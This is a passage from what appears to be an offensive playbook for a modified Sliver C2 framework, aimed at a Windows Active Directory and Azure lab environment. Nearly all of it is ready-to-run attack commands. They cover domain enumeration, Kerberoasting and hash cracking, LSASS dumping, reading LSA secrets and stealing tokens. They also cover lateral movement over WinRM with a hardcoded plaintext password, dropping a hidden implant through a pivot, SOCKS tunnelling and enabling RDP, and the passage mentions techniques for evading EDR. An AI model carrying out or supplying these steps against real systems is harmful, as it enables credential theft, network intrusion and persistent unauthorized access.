sliver (HTTPSERVER) > execute-assembly /path/to/SharpHound.exe -c All --outputdirectory C:\Windows\Temp
sliver (HTTPSERVER) > download C:\Windows\Temp\*_BloodHound.zip /tmp/

# Port scan
sliver (HTTPSERVER) > portscan --host 10.1.0.5-10 --ports 445,5985,3389,1433,135,88,389 --timeout 2000

# SPN enumeration
sliver (HTTPSERVER) > execute -o -- powershell -c \
  "([adsisearcher]'(&(objectClass=user)(servicePrincipalName=*))').FindAll() | %{ \"$($_.Properties.samaccountname[0]): $($_.Properties.serviceprincipalname)\" }"
```

## Phase 3: Credential Harvesting from Sliver

```bash
# Kerberoast with Rubeus
sliver (HTTPSERVER) > execute-assembly /path/to/Rubeus.exe kerberoast /format:hashcat /outfile:C:\Windows\Temp\hashes.txt
sliver (HTTPSERVER) > download C:\Windows\Temp\hashes.txt /tmp/
# Crack: hashcat -m 13100 /tmp/hashes.txt wordlist.txt -r rules/best64.rule

# LSA secrets (same P/Invoke technique as Meatball section)
sliver (HTTPSERVER) > execute -o -- powershell -c \
  "Get-ChildItem HKLM:\SECURITY\Policy\Secrets | Select -Expand PSChildName"

# LSASS dump
sliver (HTTPSERVER) > procdump -n lsass.exe -s /tmp/lsass.dmp
# Parse: pypykatz lsa minidump /tmp/lsass.dmp
```

## Phase 4: Token Impersonation & Lateral Movement

### Steal Token (Enhanced in This Fork)

```bash
# List processes to find Domain Admin
sliver (HTTPSERVER) > ps

# Steal token by PID (resolves owner automatically)
sliver (HTTPSERVER) > steal-token 1234
# Output: PID 1234 -> explorer.exe (owner: CONTOSO\svc.mssql)

# Or quick-impersonate with credentials
sliver (HTTPSERVER) > quick-impersonate -u svc.mssql -p "GY2W*%m!P%0HK" -d contoso \
  -e "dir \\\\blueDBServer\\C$"

# Revert
sliver (HTTPSERVER) > rev2self
```

### WinRM Lateral to DBServer

```bash
sliver (HTTPSERVER) > execute -o -- powershell -c \
  "$pass = ConvertTo-SecureString 'GY2W*%m!P%0HK' -AsPlainText -Force; \
   $cred = New-Object PSCredential('contoso\svc.mssql', $pass); \
   Invoke-Command -ComputerName blueDBServer -Credential $cred -ScriptBlock { \
     whoami /all; hostname; ipconfig /all \
   }"
```

### Deploy Sliver on DBServer via Pivot

```bash
# Option A: TCP pivot through httpserver
sliver (HTTPSERVER) > pivots tcp --bind 0.0.0.0:1234

sliver > generate --tcp-pivot HTTPSERVER_IP:1234 \
  --os windows --arch amd64 --format exe --save /tmp/pivot-implant.exe

sliver (HTTPSERVER) > upload /tmp/pivot-implant.exe C:\Windows\Temp\svc.exe

sliver (HTTPSERVER) > execute -o -- powershell -c \
  "$pass = ConvertTo-SecureString 'GY2W*%m!P%0HK' -AsPlainText -Force; \
   $cred = New-Object PSCredential('contoso\svc.mssql', $pass); \
   New-PSDrive -Name X -PSProvider FileSystem -Root '\\blueDBServer\C$\Windows\Temp' -Credential $cred; \
   Copy-Item C:\Windows\Temp\svc.exe X:\svc.exe -Force; Remove-PSDrive X; \
   Invoke-Command -ComputerName blueDBServer -Credential $cred -ScriptBlock { \
     Start-Process C:\Windows\Temp\svc.exe -WindowStyle Hidden \
   }"

# Option B: SOCKS proxy (fixed in this fork - handles RDP/high-bandwidth)
sliver (HTTPSERVER) > socks5 start -p 1080
# proxychains evil-winrm -i 10.1.0.100 -u svc.mssql -p 'GY2W*%m!P%0HK'
```

## Phase 5: RDP Access (New in This Fork)

```bash
# Direct RDP to current implant host
sliver (HTTPSERVER) > rdp -u administrator -p Password123!

# Enable RDP on target first if disabled
sliver (HTTPSERVER) > rdp --enable -u svc.mssql -p "GY2W*%m!P%0HK" -d contoso

# RDP to lateral targets via SOCKS
sliver (HTTPSERVER) > socks5 start -p 1080
# proxychains xfreerdp /v:10.1.0.100 /u:svc.mssql /p:'GY2W*%m!P%0HK' /d:contoso /cert:tofu +clipboard
```

---

# PART 3: Comparison — Meatball vs Sliver

| Aspect | Meatball C2 | Sliver C2 |
|--------|------------|-----------|
| **Initial Deploy** | Single API call | Manual RunCommand curl + staging |
| **C2 Transport** | Azure RunCommand (works through all firewalls) | Requires direct network or pivot |
| **No Outbound?** | Works perfectly | Requires pivot listener or file relay |
| **WinRM Lateral** | Built-in API handles escaping | Manual PowerShell via `execute -o` |
| **Auto Agent Deploy** | Automatic on WinRM lateral | Manual upload + execute |
| **Token Impersonation** | N/A | Enhanced steal-token + quick-impersonate |
| **RDP** | N/A | One-command `rdp` + SOCKS proxy |
| **SOCKS Proxy** | N/A | Fixed for high-bandwidth (RDP works) |
| **AV Evasion** | XOR-encrypted beacon | Harriet AES + directsyscall + EDR unhooking |
| **Best For** | Azure-native, no-outbound | Full post-exploitation, pivoting, interactive |

---

# PART 4: Troubleshooting

| Issue | Root Cause | Fix |
|-------|-----------|-----|
| `$SQLEXPRESS` returns NOT_FOUND | PS variable interpolation | Use `[char]36`: `"_SC_MSSQL" + [char]36 + "SQLEXPRESS"` |
| C# Add-Type compilation errors | Quote escaping in JSON→Go→PS chain | Use PS here-strings (`@"..."@`) |
| WinRM "incorrect password" | Special chars mangled | Use Meatball WinRM API or single-quote password |
| `reg save HKLM\SECURITY` Access Denied | SYSTEM can't save live hive | Read individual values via .NET `Registry.LocalMachine.OpenSubKey()` |
| Agent not beaconing | No outbound from VM | Use Azure RunCommand as C2 transport |
| SOCKS proxy dropping RDP | Upstream Sliver 10ms sleep bug | Fixed in this fork |
| steal-token fails for domain user | Upstream exact string match | Fixed: 3-tier matching (exact > case-insensitive > domain\user) |
| RunCommand stuck in "Creating" | VM Guest Agent not ready | Wait 5-10 min after VM boot |

## RunCommand v2 vs v1

| Feature | v1 (`POST .../runCommand`) | v2 (`PUT .../runCommands/{name}`) |
|---------|---------------------------|-----------------------------------|
| Timeout | 90 minutes max | 24 hours (`timeoutInSeconds: 86400`) |
| Execution | Synchronous | Async supported |
| Multiple commands | Replaces previous | Named, coexist |
| API version | 2023-03-01 | 2023-07-01+ |

**Always use v2** for persistent agents.
